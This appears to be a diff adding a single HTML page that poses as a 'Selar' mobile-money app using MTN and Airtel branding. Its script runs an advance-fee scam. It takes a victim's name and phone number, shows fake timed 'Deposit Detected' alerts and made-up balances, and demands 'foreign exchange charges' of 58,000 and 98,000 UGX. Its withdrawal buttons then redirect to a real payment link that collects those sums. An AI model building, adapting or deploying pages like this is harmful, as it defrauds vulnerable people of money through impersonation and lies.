@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selar Money Digital App</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .hidden { display: none; }
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 50;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .modal {
+            background: white; padding: 20px; border-radius: 12px;
+            max-width: 90%; width: 400px; text-align: center;
+        }
+        .btn-main { background: #0066ff; color: white; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+        .logo-placeholder { font-weight: bold; font-size: 2rem; color: #0066ff; margin-bottom: 20px; }
+        .disabled { pointer-events: none; opacity: 0.6; }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans">
+
+    <div id="loginPage" class="flex flex-col items-center justify-center min-h-screen p-4">
+        <div class="logo-placeholder">SELAR</div>
+        <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
+            <h2 class="text-2xl font-bold mb-6 text-center">Login</h2>
+            <input type="text" id="regName" placeholder="Name" class="w-full p-2 mb-4 border rounded">
+            <input type="tel" id="regTel" placeholder="Telephone Number" class="w-full p-2 mb-4 border rounded">
+            <input type="email" id="regEmail" placeholder="Email" class="w-full p-2 mb-4 border rounded">
+            <input type="password" id="regPass" placeholder="Password" class="w-full p-2 mb-4 border rounded">
+            <input type="password" id="regConfirm" placeholder="Confirm Password" class="w-full p-2 mb-6 border rounded">
+            <button onclick="handleLogin()" class="w-full btn-main">Login</button>
+        </div>
+    </div>
+
+    <div id="dashboard" class="hidden min-h-screen p-4">
+        <header class="flex justify-between items-center mb-6">
+            <div class="text-xl font-bold text-blue-600">SELAR DASHBOARD</div>
+            <div id="userNameDisplay" class="font-medium"></div>
+        </header>
+
+        <div class="bg-white p-6 rounded-xl shadow mb-6">
+            <p class="text-gray-500">Available Amount</p>
+            <h1 id="balanceUGX" class="text-3xl font-bold">0.00UGX</h1>
+            <p id="balanceUSD" class="text-green-600 font-semibold">0.00$</p>
+        </div>
+
+        <div id="mainNotice" class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 text-sm">
+            successfully registered your SIM Card on Selar transaction system you can send and receive transactions globally
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-6">
+            <button onclick="handleRedirect()" class="bg-white p-4 rounded shadow text-center action-btn">Withdrawal</button>
+            <button onclick="handleRedirect()" class="bg-white p-4 rounded shadow text-center action-btn">Receive</button>
+        </div>
+
+        <div class="flex justify-center gap-8 mb-6">
+            <div class="logo-box text-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/MTN_Logo.svg" width="50" id="mtnLogo" class="cursor-pointer">
+                <p class="text-xs">MTN</p>
+            </div>
+            <div class="logo-box text-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Airtel_logo.png" width="50" id="airtelLogo" class="cursor-pointer">
+                <p class="text-xs">Airtel</p>
+            </div>
+            <div class="logo-box text-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/22/Epay_Logo.png" width="50" id="epayLogo" class="cursor-pointer">
+                <p class="text-xs">Epay</p>
+            </div>
+        </div>
+
+        <h3 class="font-bold mb-2">Recent Activity</h3>
+        <div id="activitySection" class="bg-white rounded-lg shadow p-4">
+            <p class="text-gray-400 text-sm">No recent activities</p>
+        </div>
+    </div>
+
+    <div id="overlay" class="overlay hidden">
+        <div id="modalContent" class="modal">
+            </div>
+    </div>
+
+    <script>
+        let userData = { name: '', tel: '' };
+        let currentStep = 1;
+        let pressTimer;
+
+        // --- NAVIGATION ---
+        function handleLogin() {
+            userData.name = document.getElementById('regName').value;
+            userData.tel = document.getElementById('regTel').value;
+            if(!userData.name || !userData.tel) return alert("Please fill fields");
+
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            document.getElementById('userNameDisplay').innerText = "Welcome, " + userData.name;
+
+            // Step 1: Notification after 11 seconds
+            setTimeout(showDepositDetected, 11000);
+        }
+
+        function showModal(content, showBtn = true, btnText = "Confirm", callback = null) {
+            const overlay = document.getElementById('overlay');
+            const container = document.getElementById('modalContent');
+            container.innerHTML = `<div class="p-4">${content}</div>`;
+            if(showBtn) {
+                const btn = document.createElement('button');
+                btn.className = "btn-main mt-4 w-full";
+                btn.innerText = btnText;
+                btn.onclick = () => {
+                    overlay.classList.add('hidden');
+                    if(callback) callback();
+                };
+                container.appendChild(btn);
+            }
+            overlay.classList.remove('hidden');
+        }
+
+        // --- STEP 1: INITIAL DEPOSIT ---
+        function showDepositDetected() {
+            const msg = `
+                <h2 class="text-red-600 font-bold text-xl mb-2">Deposit Detected</h2>
+                <p class="text-sm">Deposit of 200$ on Sender id A001112<br>
+                Name: lolikishee<br> Address: USA CHICAGO</p>
+                <p class="mt-4 text-xs font-bold">Press confirm to initiate the transaction on Your Selar account.</p>
+            `;
+            showModal(msg, true, "Confirm", startLoadingStep1);
+        }
+
+        function startLoadingStep1() {
+            showModal("Always confirm any Transaction invoice on Your Selar account when ever You login for safety of transaction", false);
+            setTimeout(() => {
+                document.getElementById('overlay').classList.add('hidden');
+                updateDashboardStep1();
+            }, 6000);
+        }
+
+        function updateDashboardStep1() {
+            document.getElementById('balanceUGX').innerText = "743,000UGX";
+            document.getElementById('balanceUSD').innerText = "200.00$";
+            document.getElementById('mainNotice').innerHTML = `Your SIM Card doesn't support dollar deposit, Recharge your SIM Card with foreign exchange charge of 58,000UGX, Click withdrawal then on the next page fill in your mobile number ${userData.tel.substring(0,2)}XXX and you allow notification to deposit invoice transaction on Your mobile number account`;
+            document.getElementById('activitySection').innerHTML = `<div class="bg-green-100 p-2 rounded border border-green-200 text-green-800 font-medium">Received Amount 200.00$ from lolikishee, USA CHICAGO</div>`;
+            setupMtnAirtelEvents();
+        }
+
+        // --- STEP 2: MTN/AIRTEL INTERACTIONS ---
+        function setupMtnAirtelEvents() {
+            const logos = ['mtnLogo', 'airtelLogo'];
+            logos.forEach(id => {
+                const el = document.getElementById(id);
+                el.onclick = () => alert("can't access allow foreign charges to make withdrawal");
+                
+                el.onmousedown = () => {
+                    pressTimer = setTimeout(() => handleLongPress(id), 5000);
+                };
+                el.onmouseup = () => clearTimeout(pressTimer);
+                el.ontouchstart = () => { pressTimer = setTimeout(() => handleLongPress(id), 5000); };
+                el.ontouchend = () => clearTimeout(pressTimer);
+            });
+        }
+
+        function handleLongPress(id) {
+            showModal(`Depositing the transaction of 743,000UGX Selar invoice to ${userData.tel} ${userData.name}`, false);
+            setTimeout(() => {
+                const finalMsg = "Accuse us our Customer, Selar system Can't allow withdraw of international transaction which is less than 1million Ugandan Shillings, Please Consult the sender to top up the invoice to enable the withdraw directly to your Sim card";
+                showModal(finalMsg, true, "okay have understood!", finalizeStep2);
+            }, 10000);
+        }
+
+        function finalizeStep2() {
+            // Disable everything
+            document.querySelectorAll('.action-btn').forEach(b => b.classList.add('disabled'));
+            document.getElementById('mtnLogo').classList.add('disabled');
+            document.getElementById('airtelLogo').classList.add('disabled');
+            
+            // New Dashboard State
+            document.getElementById('mainNotice').classList.add('bg-yellow-50', 'border-yellow-500');
+            document.getElementById('mainNotice').innerHTML = `
+                <div class="text-center">
+                    <p class="font-bold text-lg">PAID!</p>
+                    <p>Foreign exchange charge of 58,000UGX</p>
+                    <p class="text-xs mt-2">${userData.tel} | ${userData.name}</p>
+                    <p class="italic text-blue-600">Contact the sender to increase transaction</p>
+                </div>
+            `;
+            setupEpayEvent();
+        }
+
+        // --- STEP 3: EPAY ---
+        function setupEpayEvent() {
+            const epay = document.getElementById('epayLogo');
+            epay.onmousedown = () => { pressTimer = setTimeout(handleEpayLongPress, 5000); };
+            epay.onmouseup = () => clearTimeout(pressTimer);
+            epay.ontouchstart = () => { pressTimer = setTimeout(handleEpayLongPress, 5000); };
+            epay.ontouchend = () => clearTimeout(pressTimer);
+        }
+
+        function handleEpayLongPress() {
+            showModal("Configuring deposit of 800$ from Sender id A001112 to your Selar Account please wait to confirm the transaction.", false);
+            setTimeout(() => {
+                const msg = `
+                    <h2 class="text-red-600 font-bold text-xl mb-2">Deposit Detected</h2>
+                    <p class="text-sm">Deposit of 800$ on Sender id A001112<br>
+                    Name: lolikishee<br> Address: USA CHICAGO</p>
+                    <p class="mt-4 text-xs font-bold">Press confirm to initiate the transaction on Your Selar account.</p>
+                `;
+                showModal(msg, true, "Confirm", () => {
+                    showModal("Always confirm any Transaction invoice on Your Selar account when ever You login for safety of transaction", false);
+                    setTimeout(updateFinalDashboard, 6000);
+                });
+            }, 11000);
+        }
+
+        function updateFinalDashboard() {
+            document.getElementById('overlay').classList.add('hidden');
+            document.getElementById('balanceUGX').innerText = "2,906,702.40UGX";
+            document.getElementById('balanceUSD').innerText = "800.00$";
+            document.getElementById('mainNotice').innerHTML = `Foreign exchange charge needed 98,000UGX to allow 800$ into UGX, Click withdrawal then on the next page fill in your mobile number ${userData.tel.substring(0,2)}XXX and you allow notification to deposit invoice transaction on Your mobile number account`;
+            document.getElementById('activitySection').innerHTML = `<div class="bg-purple-100 p-2 rounded border border-purple-200 text-purple-800 font-medium">Received Amount 800.00$ from lolikishee, USA CHICAGO</div>`;
+            
+            // Update redirect links
+            currentStep = 3; 
+        }
+
+        function handleRedirect() {
+            if(currentStep === 3) {
+                window.location.href = "https://pay.guto.app/@selar14?a=98000";
+            } else {
+                window.location.href = "https://pay.guto.app/@selar14?a=58000";
+            }
+        }
+    </script>
+</body>
+</html>
